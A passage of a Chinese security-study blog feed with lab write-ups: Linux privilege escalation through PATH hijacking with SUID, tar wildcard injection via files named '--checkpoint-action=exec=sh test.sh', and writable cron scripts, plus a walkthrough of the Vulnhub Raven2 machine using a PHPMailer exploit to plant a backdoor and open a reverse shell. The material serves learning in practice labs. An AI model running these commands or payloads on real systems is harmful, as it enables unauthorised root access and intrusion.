alt="image-20220626222928037"></p><p>其中就有Mimikatz模块；</p><p>调用Invoke-Mimikatz的功能：<br><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626223142860.png" alt="image-20220626223142860"></p><blockquote><p>端口扫描：查看目录对应文件有演示语法，其他同理 </p><p>Invoke-PortScan -StartAddress 192.168.3.21 -EndAddress 192.168.3.31 -ResolveHost -ScanPort</p></blockquote><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626223342353.png" alt="image-20220626223342353"></p><p>扫出来就会有：ip、主机名、开放端口（1433对应SQLserver数据库）</p><p>除了口令攻击，还可以对服务进行攻击；</p><blockquote><p>其他功能：删除补丁，反弹 Shell，凭据获取等</p><p>探针域内主机角色及服务信息</p><p>利用开放端口服务及计算机名判断</p><p>核心业务机器:</p><p>1.高级管理人员、系统管理员、财务&#x2F;人事&#x2F;业务人员的个人计算机</p><p>2.产品管理系统服务器</p><p>3.办公系统服务器</p><p>4.财务应用系统服务器</p><p>5.核心产品源码服务器（自建 SVN、GIT）</p><p>6.数据库服务器</p><p>7.文件或网盘服务器、共享服务器</p><p>8.电子邮件服务器</p><p>9.网络监控系统服务器</p><p>10.其他服务器（内部技术文档服务器、其他监控服务器等）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升-Linux提权2</title>
      <link href="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/"/>
      <url>/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00-Linux-提权SUID配合环境变量本地提权"><a href="#0x00-Linux-提权SUID配合环境变量本地提权" class="headerlink" title="0x00 Linux 提权SUID配合环境变量本地提权"></a>0x00 Linux 提权SUID配合环境变量本地提权</h2><h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>首先需要普通权限用户登录主机：<br><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625095249671.png" alt="image-20220625095249671"></p><p>上传demo.c文件至主机的普通用户文件夹：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625094943570.png" alt="image-20220625094943570"></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625095421796.png" alt="image-20220625095421796"></p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><blockquote><p>使用以下命令编译demo.c文件，编译出shell文件：<br>gcc demo.c -o shell</p></blockquote><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625095538649.png" alt="image-20220625095538649"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>环境变量：一个命令对应执行的文件，比如输入：Java，可能执行的是一个路径下的文件。（Linux的命令都存放在&#x2F;bin、&#x2F;sbin目录下）：<br><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625095829824.png" alt="image-20220625095829824"></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625095929902.png" alt="image-20220625095929902"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>sh是linux中运行shell的命令，是shell的解释器，shell脚本是linux中壳层与命令行界面，用户可以在shell脚本输入命令来执行各种各样的任务。</p><p>执行.&#x2F;sh(等价于直接执行sh,环境变量的作用就是不用加路径)</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625100222306.png" alt="image-20220625100222306"></p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><blockquote><p>执行以下命令：复制&#x2F;bin目录下的sh文件到&#x2F;tmp目录下的ps文件</p><p>cp &#x2F;bin&#x2F;sh &#x2F;tmp&#x2F;ps</p></blockquote><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625100749792.png" alt="image-20220625100749792"></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625100830850.png" alt="image-20220625100830850"></p><p>这里直接执行ps输出进程信息，而执行.&#x2F;ps相当于执行的式&#x2F;bin目录下的sh文件，没有输出。</p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><blockquote><p>执行以下命令：</p><p>export PATH&#x3D;&#x2F;tmp:$PATH</p></blockquote><p>将&#x2F;tmp设置为环境变量（在原有的环境变量前面添加一个&#x2F;tmp，现在的ps应该就是.&#x2F;sh,输入的ps没有反应了。</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625101134731.png" alt="image-20220625101134731"></p><p>现在执行ps命令和之前执行.&#x2F;p返回结果相同：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625101300498.png" alt="image-20220625101300498"></p><p>由于添加了&#x2F;tmp为环境变量，这是执行ps是执行的&#x2F;tmp文件下的ps文件，相当于执行的是&#x2F;bin目录下的sh文件，返回的是shell。</p><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>执行上传的demo.c文件：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625102300671.png" alt="image-20220625102300671"></p><p>没有提权成功。</p><p>查看ps是否又suid权限：<br><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625102350133.png" alt="image-20220625102350133"></p><p>以root给ps赋予suid权限：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625102722037.png" alt="image-20220625102722037"></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625102700377.png" alt="image-20220625102700377"></p><p>再次查看，ps有suid权限，但是&#x2F;user&#x2F;bin目录下：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625103704881.png" alt="image-20220625103704881"></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625103728080.png" alt="image-20220625103728080"></p><h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><p>参考了下文章：</p><p>需要执行的命令顺序：</p><blockquote><p>ls<br>gcc demo.c -o shell<br>chmod u+s shell<br>ls -la shell</p><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p></blockquote><p>先使用root权限将编译好的shell文件提升至suid权限，下图中可以看到shell的权限为root：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625105457185.png" alt="image-20220625105457185"></p><p>使用Find命令，搜索具有SUID或4000权限的文件。</p><blockquote><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p></blockquote><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625105710951.png" alt="image-20220625105710951"></p><p>可以看到shell文件。</p><p>来到&#x2F;home&#x2F;user&#x2F;script目录下执行shell文件：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625105843299.png" alt="image-20220625105843299"></p><p>$变为#，成功提权。</p><h3 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h3><p>原理分析：执行shell脚本会以uid(0)gid(0)（就是root）执行&#x2F;bin&#x2F;sh，但是字面显示的却是ps，只要ps命令拥有suid权限，同时<strong>shell文件也必须拥有SUID权限</strong>，就会以root执行demo脚本，进而执行sh进入一个shell界面。因此，必须配合SUID权限再进行环境变量提权。</p><p>前提条件：</p><p>1、执行的文件必须有SUID权限；</p><p>2、本地用户</p><p>之前没有成功就是因为shell文件没有suid权限，是user权限：<br><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625110209697.png" alt="image-20220625110209697"></p><p>###0x09</p><p>Linux环境变量提权参考文章：</p><p><a href="https://blog.csdn.net/qq_50854790/article/details/120941341">https://blog.csdn.net/qq_50854790/article/details/120941341</a></p><h2 id="0x01-Linux-提权本地定时任务安全"><a href="#0x01-Linux-提权本地定时任务安全" class="headerlink" title="0x01 Linux 提权本地定时任务安全"></a>0x01 Linux 提权本地定时任务安全</h2><h3 id="0x00-路径问题"><a href="#0x00-路径问题" class="headerlink" title="0x00 路径问题"></a>0x00 路径问题</h3><p><strong>利用计划任务指向的文件的相对路径解析问题</strong></p><p>1、查看当前电脑的定时任务（m分钟，h小时，dom周，mon月）</p><p>2、全部*****代表每一分钟执行一次</p><p>3、SHELL变量指定了系统要使用哪个shell，这里是bash</p><p>4、PATH变量指定了系统执行命令的路径，user是以root权限运行</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625112211154.png" alt="image-20220625112211154"></p><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>先以root权限天年假一个计划任务，每分钟执行一次，并且不写绝对路径：</p><blockquote><p>crontab -e编辑计划任务</p><p>crontab -l查看计划任务</p></blockquote><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625113636168.png" alt="image-20220625113636168"></p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>计划任务test.sh文件默认会在&#x2F;usr&#x2F;local&#x2F;bin路径下执行，先将test.sh文件上传至默认路径&#x2F;usr&#x2F;local&#x2F;bin，创建文件将日期写入time.log：<br><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625114212834.png" alt="image-20220625114212834"></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625114301521.png" alt="image-20220625114301521"></p><p>赋予test.sh执行权限：<br><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625114509929.png" alt="image-20220625114509929"></p><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>没有复现成功，简述一下思路和过程：</p><p>之后，等待一会，查看&#x2F;tmp目录会出现time.log文件，再切换用户，在当前用户目录下创建test.sh，将&#x2F;bin目录下的bash命令（一种shell）移动到临时目录，并且给予suid权限(当前用户、用户组、其它用户都有suid权限)，给予test.sh执行权限，继续&#x2F;tmp目录下查看是否生成bush文件，若生成执行bush文件即可提权。</p><h3 id="0x04-命令安全（WS注入）"><a href="#0x04-命令安全（WS注入）" class="headerlink" title="0x04 命令安全（WS注入）"></a>0x04 命令安全（WS注入）</h3><p><strong>利用通配符配合命令参数自定义命令实现提权</strong></p><p>先创建backup.sh文件上传至&#x2F;home&#x2F;user&#x2F;script目录下：</p><p>（使用cd切换到&#x2F;home&#x2F;user&#x2F;script&#x2F;并且使用tar czf命令压缩为&#x2F;tmp&#x2F;backup.tar.gz文件）</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625143556816.png" alt="image-20220625143556816"></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625144316531.png" alt="image-20220625144316531"></p><p>把script的文件夹里面的所有文件打包好至&#x2F;tmp目录下。</p><p><strong>原理：进入.pip目录下，备份*（所有文件）到&#x2F;tmp目录下为：backup.tar.gz</strong></p><p><strong>参数czf的含义：&#x2F;将目录里所有文件打包成.tar后，并且将其用gzip压缩，生成一个gzip压缩过的包，命名为backup.tar.gz</strong></p><p>查看&#x2F;tmp目录，生成了备份文件：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625150237736.png" alt="image-20220625150237736"></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625150431434.png" alt="image-20220625150431434"></p><h3 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h3><p>切换用户，在&#x2F;home&#x2F;user&#x2F;script目录下(要打包压缩的目录)创建三个文件：</p><blockquote><p>echo ‘cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;bash; chmod +s &#x2F;tmp&#x2F;bash’ &gt; &#x2F;home&#x2F;user&#x2F;script&#x2F;test.sh</p><p>echo “” &gt; “–checkpoint-action&#x3D;exec&#x3D;sh test.sh”</p><p>echo “” &gt; –checkpoint&#x3D;1</p></blockquote><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625150907679.png" alt="image-20220625150907679"></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625151040915.png" alt="image-20220625151040915"></p><p>进入到&#x2F;tmp目录下看到出现bush文件：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625151220402.png" alt="image-20220625151220402"></p><h3 id="0x06-1"><a href="#0x06-1" class="headerlink" title="0x06"></a>0x06</h3><p>打开backup.tar.gz发现只有两个文件（–checkpoint-action&#x3D;exec&#x3D;sh test.sh和–checkpoint&#x3D;1不见了）：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625151834224.png" alt="image-20220625151834224"></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625151902122.png" alt="image-20220625151902122"></p><p>定时任务打包是将整个文件夹下的文件打包，而当系统真正执行打包操作时，会将目录下的所有文件名一个一个传参给<code>*</code>执行打包操作。前几个文件都没问题正常打包，但是当打包到–checkpoint&#x3D;1文件和–checkpoint-action&#x3D;exec&#x3D;sh test.sh文件时，执行的相当于：</p><pre class="line-numbers language-none"><code class="language-none">tar czf &#x2F;tmp&#x2F;backup.tar.gz --checkpoint&#x3D;1 --checkpoint-action&#x3D;exec&#x3D;sh test.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>checkpoint、–checkpoint-action正好是tar命令的参数，打印进度</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625151611025.png" alt="image-20220625151611025"></p><p>checkpoint-action&#x3D;exec&#x3D;sh test.sh相当于执行sh,从输入流调用shell，然后再sh里面执行test.sh,而test.sh是将bash复制到&#x2F;tmp目录，因此这里的<code>bash有suid权限</code>：<br><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625151644311.png" alt="image-20220625151644311"></p><p>tar命令参考文章：</p><p><a href="https://www.cnblogs.com/manong--/p/8012324.html">https://www.cnblogs.com/manong--/p/8012324.html</a></p><h3 id="0x07-1"><a href="#0x07-1" class="headerlink" title="0x07"></a>0x07</h3><p>使用本地用户提权：</p><pre class="line-numbers language-none"><code class="language-none">执行：.&#x2F;bash -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625153120157.png" alt="image-20220625153120157"></p><p>root权限，成功提权。</p><h3 id="0x08-命令问题总结"><a href="#0x08-命令问题总结" class="headerlink" title="0x08 命令问题总结"></a>0x08 命令问题总结</h3><p>1、有可操作的命令</p><p>2、命令中有*（通配符）</p><h3 id="0x09-权限问题"><a href="#0x09-权限问题" class="headerlink" title="0x09 权限问题"></a>0x09 权限问题</h3><p><strong>利用不安全的权限分配操作导致的定时文件覆盖</strong></p><p><strong>漏洞成因</strong>：管理员正常创建一个文件test.sh时，默认是没有执行权限的，此时管理员若想执行这文件，必须给它赋执行权限，正常的赋权命令是chmod +x test.sh（所有人都可以执行，更安全的是只有创建用户可以执行：chmod u+x test.sh），这样就可以执行test.sh。</p><p>并且组和其他成员无法修改覆盖这个文件（即写权限），但是粗心的管理员会直接chmod 777 test.sh，这样虽然也可以实现执行test.sh的目的，但是会导致权限扩大，即组和其他成员都可以对文件修改覆盖，造成风险（写权限风险最大）。</p><h3 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h3><p>创建check.sh文件上传至&#x2F;home&#x2F;user目录下，并设置权限为777：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625155616833.png" alt="image-20220625155616833"></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625155735788.png" alt="image-20220625155735788"></p><h3 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h3><p>切换用户，以普通用户登录时也可以拥有check.sh的读写执行权限，这个时候就可以重复命令问题（WS注入）写入提权命令进行提权。（也就是进行重写覆盖）</p><blockquote><p>可以使用查看权限的命令查看那些文件拥有写入权限：<br>ls -al &#x2F;home&#x2F;user</p></blockquote><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625160612745.png" alt="image-20220625160612745"></p><p>判断出那些文件拥有写入权限进行重写覆盖提权。</p><h2 id="0x02-Linux数据库提权-Vulnhub-Raven2"><a href="#0x02-Linux数据库提权-Vulnhub-Raven2" class="headerlink" title="0x02 Linux数据库提权-Vulnhub-Raven2"></a>0x02 Linux数据库提权-Vulnhub-Raven2</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>靶机：Vulnhub-Raven2</p><p>攻击机：Kali</p><p>攻击流程：探针 IP 及端口-利用漏洞获取 web 权限-信息收集-查看数据库配置文件-利用 Mysql 提 </p><p>权 Linux（Mysql 版本区别同 Windows） </p><h3 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h3><blockquote><p>nmap扫描网段：<br>nmap  x.x.x.0&#x2F;24</p></blockquote><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625162853972.png" alt="image-20220625162853972"></p><p>有一个ip开放web服务，打开看看：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625161742964.png" alt="image-20220625161742964"></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625161801631.png" alt="image-20220625161801631"></p><p>底部有Colorlib字样，应该是cms：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625161859845.png" alt="image-20220625161859845"></p><p>搜一下，不是cms：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625162006004.png" alt="image-20220625162006004"></p><h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><p>没其他思路，扫一下目录，使用Kali自带的dirb：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625163313180.png" alt="image-20220625163313180"></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625163401326.png" alt="image-20220625163401326"></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625163604368.png" alt="image-20220625163604368"></p><p>警告说：vendor目录是列举的，不需要去扫描，猜测应该存在目录遍历漏洞，访问这个目录试试。</p><h3 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h3><p>果真是个目录遍历：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625163759858.png" alt="image-20220625163759858"></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625163837384.png" alt="image-20220625163837384"></p><p>还是Linux服务器。</p><h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p>打开一个一个看，在PATH目录发现了第一个<code>flag1&#123;a2c1f66d2b8051bd3a5874b5b6e43e21&#125;</code></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625163933061.png" alt="image-20220625163933061"></p><p>还给得到了网站绝对路径。</p><p>打开README.md文件，看到有一个PHPMailer服务：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625164332351.png" alt="image-20220625164332351"></p><p>打开VERSION目录是版本号，推测是PHPMailer的版本</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625164430358.png" alt="image-20220625164430358"></p><h3 id="0x05-2"><a href="#0x05-2" class="headerlink" title="0x05"></a>0x05</h3><p>百度一下PHPMailer的漏洞：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625164550545.png" alt="image-20220625164550545"></p><p>有很多；利用msf搜索可利用漏洞：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625164809853.png" alt="image-20220625164809853"></p><p>网上师傅们都选择40974这个，将exp拷贝到当前目录；</p><p>命令：cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;40974.py .</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625165247490.png" alt="image-20220625165247490"></p><p>修改一些40974.py的一些参数：</p><p>头部加上：</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python# -*- coding: utf-8 -*-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625165447254.png" alt="image-20220625165447254"></p><p>target要改成靶机的地址</p><p>backdoor就是后门文件，要和最后一个框里的名称对应</p><p>第二个ip是攻击机IP和对应端口</p><p>最后一个框的路径和名称要改一下，不能用默认的</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625173525018.png" alt="image-20220625173525018"></p><p>最后执行：</p><blockquote><p>python 40974.py</p></blockquote><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625170506205.png" alt="image-20220625170506205"></p><h3 id="0x06-2"><a href="#0x06-2" class="headerlink" title="0x06"></a>0x06</h3><p>访问<a href="http://192.168.216.152/contact.php%EF%BC%8C%E4%BC%9A%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AAnide.php%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%EF%BC%9A">http://192.168.216.152/contact.php，会自动生成一个nide.php后门文件：</a></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625170755838.png" alt="image-20220625170755838"></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625170748808.png" alt="image-20220625170748808"></p><p>访问后门文件：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625173853529.png" alt="image-20220625173853529"></p><p>开启监听，返回shell：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625173829050.png" alt="image-20220625173829050"></p><p>继续使用python获取pty：</p><blockquote><p>python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p></blockquote><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625174105830.png" alt="image-20220625174105830"></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625174158245.png" alt="image-20220625174158245"></p><p>第二个flag：<code>flag2&#123;6a8ed560f0b5358ecf844108048eb337&#125;</code></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625174234210.png" alt="image-20220625174234210"></p><h3 id="0x07-2"><a href="#0x07-2" class="headerlink" title="0x07"></a>0x07</h3><blockquote><p>使用find查找一下：<br>find -name flag*</p></blockquote><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625174552005.png" alt="image-20220625174552005"></p><p>flag3是个图片：flag3.png；无法直接在命令行中查看。但是该图片在网站目录下，因此可以直接访问网站路径即可查看图片内容</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625174957425.png" alt="image-20220625174957425"></p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625175012303.png" alt="image-20220625175012303"></p><h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><p>最后一个flag4需要提权。</p><p>查看网站根目录：<br><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625175213097.png" alt="image-20220625175213097"></p><p>进入wordpress文件夹里，发现其配置文件：<br><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625175257217.png" alt="image-20220625175257217"></p><p>查看wp-config.php的内容，发现了网站的mysql数据库wordpress，以及mysql的root密码R@v3nSecurity：<br><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625175420420.png" alt="image-20220625175420420"></p><p>###0x09</p><p>利用获取到的账号密码，登录mysql</p><blockquote><p>mysql -u root -pR@v3nSecurity</p></blockquote><p>本来可以直接使用Kali连接数据库，连了很长时间没有反应，也不弹出mysql命令框：<br><img 